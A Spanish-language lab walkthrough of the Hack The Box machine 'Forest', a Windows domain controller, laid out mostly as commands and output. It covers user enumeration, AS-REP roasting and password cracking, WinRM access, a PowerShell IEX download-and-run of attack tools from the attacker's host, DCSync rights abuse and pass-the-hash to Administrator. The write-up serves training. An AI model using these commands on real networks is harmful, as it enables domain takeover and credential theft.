# Introduction
**Maquina:** Forest
**IP:** 10.10.10.161
**Local:** 10.10.16.75

```shell 
$ target=10.10.10.161
$ echo $target 
10.10.10.161
```

# Reconocimiento 
```shell 
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.161
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.161 ()	Status: Up
Host: 10.10.10.161 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49670/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49684/open/tcp/////, 49706/open/tcp/////, 49921/open/tcp/////
# Nmap done at Wed Aug  9 19:09:36 2023 -- 1 IP address (1 host up) scanned in 15.40 seconds

$ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -oN targeted 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-10 01:51:19Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h55m45s, deviation: 4h02m30s, median: -24m15s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-08-09T18:51:32-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-08-10T01:51:31
|_  start_date: 2023-08-09T04:21:11

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug  9 21:16:05 2023 -- 1 IP address (1 host up) scanned in 40.91 seconds
```

```shell 
$ smbmap -H $target
[+] IP: 10.10.10.161:445        Name: 10.10.10.161
```

```shell 
crackmapexec smb $target
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

# RPC Bind
Forma 1
```shell 
$ rpcclient -U "" -N -c enumdomusers 10.10.10.161
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[madiun1] rid:[0x2582]
user:[madiun2] rid:[0x2583]
user:[slide] rid:[0x2585]
```

Guardamos los usuarios encontrados en un archivo `users.txt` : 
```shell 
rpcclient -U "" -N -c enumdomusers 10.10.10.161 | grep -oP 'user:\[\K[^]]+' | sudo tee users.txt >/dev/null
```


Forma 2
```shell 
$ ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.10.10.161 | grep userPrincipalName
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
userPrincipalName: sebastien@htb.local
userPrincipalName: santi@htb.local
userPrincipalName: lucinda@htb.local
userPrincipalName: andy@htb.local
userPrincipalName: mark@htb.local
```

# Acceso Inicial 

Instalo impacket para usar el `GetNPUsers.py`

```shell 
python3 -m pipx install impacket
```
```shell 
$ GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip $target
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c81a722473928cf65dd9feecf2dcb65f$f039e4172b8ca84e02720a1b78f69688267a33b595aaa963be7478e5cae98806dffc4d7033c357dc92b96070462a4c2217cc619fb675f70f5dbf304d3a19260d3e1d6fac43eff3e5e0b7cd30edf3ccc7922eec7311ec1c44417842c51e673de04a7a7204e3517ccaecf353988ee0fdda5382310a31c0db6cc1b8a3f16ef2be1b60a56c5a08feceaba7efd60bc733b02c4fc72563c1e66ffdc1dd0ffe4b46b2e65c62519cb9b2308e1abd12b88f44352967497b8b07fb3f68313c7a5e1f2f6c7a8b0668f6537706f7f4a3f3e6b667aa68f58bc4f45d0f9541ae8e063f46ddd6cf75537e0654ec
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User madiun1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User madiun2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User slide doesn't have UF_DONT_REQUIRE_PREAUTH set
``` 
Tenemos un hash para el usuario `svc-alfresco`; se puede preguntar especificamente por el 

```bash 
$ GetNPUsers.py htb.local/svc-alfresco -dc-ip $target -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:1c73dacf0ab5c4f341d4e34fa1f6e6fd$852b3e0f1d9ee0f2d22213dc1148505806d02d0e763b0fa84f58524747f661561871734f2deee12f7b325f09c1f1c9a55e667eed333f0896394036d5fcc01ae7efa5178ef43da4014f5be75fa7a5286863422d8bb92ed551ee0c5a93fae81373db9ad67ad0bd336ed25091738cb0f6eb8ad4445eb7f8cb5b5799cf970898eaf94148aee1e63c28ba60529d2cda0d201bd0f47d4dc356648d8f859c7e32a0044c1d8f52ad4409e129be5e617574f0e27895e81d8f13883cb1affdcc58f4b90f9eb0b052dac2d680a080e7b51a8a6266ad1e05bd489968c913007d896836c93eafe85ddda8005a
``` 

guardamos el hash un archivo y usamos johnTheRipper para obtener la clave
```bash 
$ john svc-alfresco.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
4 1g 0:00:00:07 DONE (2023-08-12 03:01) 0.1364g/s 139348p/s 139348c/s 139348C/s s3t1yo..s3rvice
2 0g 0:00:00:20 DONE (2023-08-12 03:01) 0g/s 172566p/s 172566c/s 172566C/s    333   .abygurl69
3: Warning: Only 1 candidate left, minimum 4 needed for performance.
3 0g 0:00:00:20 DONE (2023-08-12 03:01) 0g/s 172152p/s 172152c/s 172152C/sa6_123
1: Warning: Only 2 candidates left, minimum 4 needed for performance.
1 0g 0:00:00:21 DONE (2023-08-12 03:01) 0g/s 170434p/s 170434c/s 170434C/s                   .ie168
Waiting for 3 children to terminate
Session completed
```
El password para `svc-alfresco` es `s3rvice`. 

tambien se puede obtener el password usando `hashcat` 

```bash 
$ hashcat -m 18200 svc-alfresco.hash  /usr/share/wordlists/rockyou.txt   
```

Usando `crackmapexec` validamos que el password obtenido sea bueno.
```bash 
$ crackmapexec smb $target -u svc-alfresco -p s3rvice -d htb.local
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```
# Acceso WinRM

```bash 
$ crackmapexec winrm $target -u svc-alfresco -p s3rvice -d htb.local
HTTP        10.10.10.161    5985   10.10.10.161     [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   10.10.10.161     [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```
tenemos acceso (Pwn3d!), usamos evil-winrm para acceder al usuario

```bash 
$ evil-winrm -i $target -u svc-alfresco -p s3rvice
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cat ../Desktop/user.txt
cd724be6be88e5277eeef4d511fa0782
```
Con lo que obtenemos el user flag que estaba en el Escritorio.

# Escalado de privilegios

Descargo el script para bloodhound
```bash 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://$local/SharpHound.ps1')

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/20/2023   3:41 AM          15473 20230820034103_BloodHound.zip
-a----        8/20/2023   3:41 AM          24260 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
```

Descargamos el zip `20230820034103_BloodHound.zip` para analizarlo 
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\bh> download C:\Users\svc-alfresco\Documents\bh\20230820034103_BloodHound.zip forest.zip

Info: Downloading C:\Users\svc-alfresco\Documents\bh\20230820034103_BloodHound.zip to forest.zip

Info: Download successful!
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user john abc123! /add /domain

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" john /add

```

Descargamos el powerview.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://$local/PowerView.ps1')
```


$pass = ConvertTo-SecureString -String "abc123!" -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'htb\john', $pass
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
*Segun Saavitar*
Add-DomainObjectACL -PrincipalIdentity john -Credential $cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync



$pass = convertto-securestring 'abc123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync


HASh = 32693b11e6aa90eb43d32c72a07ceea6 


$ crackmapexec winrm $target -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6' 

$ evil-winrm -i $target -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6' 

root.txt
22f8d0d0098342c7bed731742791cfc1

